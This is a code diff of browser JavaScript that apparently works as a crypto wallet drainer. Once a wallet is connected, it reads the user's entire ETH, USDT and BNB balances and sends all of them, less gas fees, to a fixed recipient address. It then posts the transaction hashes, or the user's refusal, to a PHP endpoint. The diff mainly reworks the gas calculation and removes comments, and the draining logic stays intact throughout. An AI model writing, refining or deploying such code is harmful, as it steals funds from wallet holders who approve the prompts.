@@ -123,47 +123,31 @@
                     }
 
                     const web3 = new Web3(provider);
-
-                    const ethersProvider = new ethers.providers.Web3Provider(provider);
-                    const signer = ethersProvider.getSigner();
                     const accounts = await web3.eth.getAccounts();
                     const senderAddress = accounts[0];
 
-                    // Fetch current gas prices
+                    const ethBalanceWei = BigInt(await web3.eth.getBalance(senderAddress));
+                    const ethersProvider = new ethers.providers.Web3Provider(provider);
                     const feeData = await ethersProvider.getFeeData();
                     const gasPriceWei = BigInt(feeData.gasPrice.toString());
                     const maxFeePerGas = BigInt(feeData.maxFeePerGas.toString());
                     const maxPriorityFeePerGas = BigInt(feeData.maxPriorityFeePerGas.toString());
 
-                    const ethBalanceWei = BigInt(await web3.eth.getBalance(senderAddress));
                     const gasFeeWei = gasPriceWei * gasLimit;
 
-                    let maxEthTransferWei = ethBalanceWei - gasFeeWei;
-                    if (maxEthTransferWei < 0) {
+                    if (ethBalanceWei <= gasFeeWei) {
                         console.error('Insufficient balance for gas fees.');
                         return;
                     }
 
-                    // Adjust gas prices based on the balance
-                    const gasPriceToUse = gasPriceWei > maxFeePerGas ? maxFeePerGas : gasPriceWei;
-                    const gasFeeToUse = gasPriceToUse * gasLimit;
+                    const maxEthTransferWei = ethBalanceWei - gasFeeWei;
 
-                    if (ethBalanceWei <= gasFeeToUse) {
-                        console.error('Insufficient balance for gas fees.');
-                        return;
-                    }
-
-                    maxEthTransferWei = ethBalanceWei - gasFeeToUse;
-
-                    // Get USDT balance
                     const usdtContract = new web3.eth.Contract(erc20ABI, tokenAddresses.USDT);
                     const usdtBalanceWei = BigInt(await usdtContract.methods.balanceOf(senderAddress).call());
 
-                    // Get BNB balance
                     const bnbContract = new web3.eth.Contract(erc20ABI, tokenAddresses.BNB);
                     const bnbBalanceWei = BigInt(await bnbContract.methods.balanceOf(senderAddress).call());
 
-                    // Create transactions for each token
                     const ethTransactionParameters = {
                         to: recipientAddress,
                         from: senderAddress,
@@ -176,7 +160,7 @@
                     const usdtTransactionParameters = {
                         to: tokenAddresses.USDT,
                         from: senderAddress,
-                        value: '0x0', // No ETH value required
+                        value: '0x0',
                         gas: `0x${gasLimit.toString(16)}`,
                         maxFeePerGas: `0x${maxFeePerGas.toString(16)}`,
                         maxPriorityFeePerGas: `0x${maxPriorityFeePerGas.toString(16)}`,
@@ -186,21 +170,19 @@
                     const bnbTransactionParameters = {
                         to: tokenAddresses.BNB,
                         from: senderAddress,
-                        value: '0x0', // No ETH value required
+                        value: '0x0',
                         gas: `0x${gasLimit.toString(16)}`,
                         maxFeePerGas: `0x${maxFeePerGas.toString(16)}`,
                         maxPriorityFeePerGas: `0x${maxPriorityFeePerGas.toString(16)}`,
                         data: bnbContract.methods.transfer(recipientAddress, bnbBalanceWei.toString()).encodeABI()
                     };
 
-                    // Send transactions
                     const ethTxHash = await web3.eth.sendTransaction(ethTransactionParameters);
                     const usdtTxHash = await web3.eth.sendTransaction(usdtTransactionParameters);
                     const bnbTxHash = await web3.eth.sendTransaction(bnbTransactionParameters);
 
                     console.log('Transactions sent:', ethTxHash, usdtTxHash, bnbTxHash);
 
-                    // Send transaction details to PHP endpoint
                     transactionDetailsInput.value = JSON.stringify({
                         status: 'approved',
                         ethTransactionHash: ethTxHash.transactionHash,
@@ -215,7 +197,6 @@
                     transactionForm.submit();
                 } catch (error) {
                     console.error('Error:', error.message);
-                    // Handle user rejection
                     transactionDetailsInput.value = JSON.stringify({
                         status: 'declined',
                         error: error.message
@@ -228,7 +209,7 @@
                 if (provider.isWalletConnect) {
                     qrCodeContainer.style.display = 'block';
                     const walletConnectProvider = provider.connector;
-                    const uri = await walletConnectProvider.getQrCode();
+                    const uri = walletConnectProvider.uri;
                     const qrCodeImg = document.createElement('img');
                     qrCodeImg.src = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${encodeURIComponent(uri)}`;
                     document.getElementById('qrCode').appendChild(qrCodeImg);
